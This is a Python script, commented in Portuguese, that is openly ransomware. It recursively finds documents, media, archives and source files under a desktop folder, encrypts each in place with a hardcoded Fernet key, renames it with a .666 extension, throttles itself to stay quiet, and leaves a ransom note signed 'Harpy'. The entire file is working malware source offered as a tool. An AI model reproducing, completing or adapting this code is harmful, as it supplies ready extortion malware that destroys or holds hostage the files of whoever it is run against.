import os
import time
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

init(autoreset=True)  # Reset automático das cores no terminal

# ==============================
# CONFIGURAÇÕES
# ==============================

VERBOSE = True
RootDir = os.path.expanduser("/home/nad/Desktop/")
key_generaring = False  # Apenas True se quiser gerar a key.key
key_path = "key.key" if key_generaring else "6xaumrWOMkIdxNX-9sAwBYoBwHpsHbm3Cz7heO9-n5A="

# Extensões de arquivos seguros para criptografia (usuário)
EXTENSOES_ALVO = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".odt", ".ods", ".jpg", ".jpeg", ".png", ".mp3", ".wav", ".zip",
    ".rar", ".7z", ".tar", ".gz", ".py", ".c", ".cpp", ".js", ".html", ".css",
    ".sql", ".xml", ".json", ".csv", ".rtf", ".log", ".ini", ".bak",
    ".mp4", ".avi", ".mkv", ".mov", ".flac", ".apk", ".epub", ".mobi"
}

# ==============================
# UTILITÁRIOS
# ==============================

def get_username():
    return os.getenv("USER") or os.getenv("LOGNAME") or os.getenv("USERNAME")

def log(msg, level="info", verbose=VERBOSE):
    if not verbose:
        return

    if level == "info":
        print(Fore.CYAN + msg)
    elif level == "ok":
        print(Fore.GREEN + msg)
    elif level == "warn":
        print(Fore.YELLOW + msg)
    elif level == "error":
        print(Fore.RED + msg)
    else:
        print(msg)

# ==============================
# CHAVE
# ==============================

def gerar_ou_carregar_chave():
    if key_generaring:
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                chave = f.read()
        else:
            chave = Fernet.generate_key()
            with open(key_path, "wb") as f:
                f.write(chave)
    else:
        chave = key_path.encode()  # Precisa estar em bytes

    return chave

# ==============================
# BUSCA DE ARQUIVOS
# ==============================

def encontrar_arquivos(diretorio_base):
    arquivos_para_criptografar = []
    arquivos_excluidos = {"ransom.py", "decrypt.py", "key.key"}

    log(f"[INFO] Escaneando: {diretorio_base}")
    for root, dirs, files in os.walk(diretorio_base):
        log(f"[INFO] Pasta: {root}")
        for file in files:
            if file in arquivos_excluidos or file.endswith(".666"):
                continue

            ext = os.path.splitext(file)[1].lower()
            if ext not in EXTENSOES_ALVO:
                log(f"[IGNORADO] {file} — extensão fora da whitelist", level="warn")
                continue

            caminho_absoluto = os.path.abspath(os.path.join(root, file))
            arquivos_para_criptografar.append(caminho_absoluto)

    return arquivos_para_criptografar

# ==============================
# CRIPTOGRAFIA
# ==============================

def criptografar_arquivos(arquivos, fernet):
    for i, file_path in enumerate(arquivos):
        try:
            with open(file_path, "rb") as f:
                dados = f.read()

            dados_criptografados = fernet.encrypt(dados)

            with open(file_path, "wb") as f:
                f.write(dados_criptografados)

            novo_nome = file_path + ".666"
            os.rename(file_path, novo_nome)

            log(f"[+] Criptografado: {novo_nome}", level="ok")

        except Exception as e:
            log(f"[!] ERRO: {file_path} => {e}", level="error")

        if i % 5 == 0:
            time.sleep(5)

# ==============================
# MENSAGEM DE RESGATE
# ==============================

def PayForARansom():
    message_file = os.path.join(RootDir, "README_IDIOT.txt")
    mensagem = f"""
Olá {get_username()}, seus arquivos foram criptografados com sucesso.

Pra recuperar, você vai precisar de uma chave exclusiva.

Boa sorte.

— Harpy
"""
    try:
        with open(message_file, "w") as f:
            f.write(mensagem)
        log(f"[+] Mensagem de resgate criada em: {message_file}", level="ok")
    except Exception as e:
        log(f"[!] ERRO ao criar mensagem de resgate: {e}", level="error")

# ==============================
# EXECUÇÃO PRINCIPAL
# ==============================

if __name__ == "__main__":
    try:
        os.nice(10)
    except:
        pass

    log(f"[🦅] Iniciando como usuário: {get_username()}")
    chave = gerar_ou_carregar_chave()
    fernet = Fernet(chave)

    arquivos = encontrar_arquivos(RootDir)
    criptografar_arquivos(arquivos, fernet)
    PayForARansom()
    log("[✅] Missão encerrada. Alvo comprometido.", level="ok")
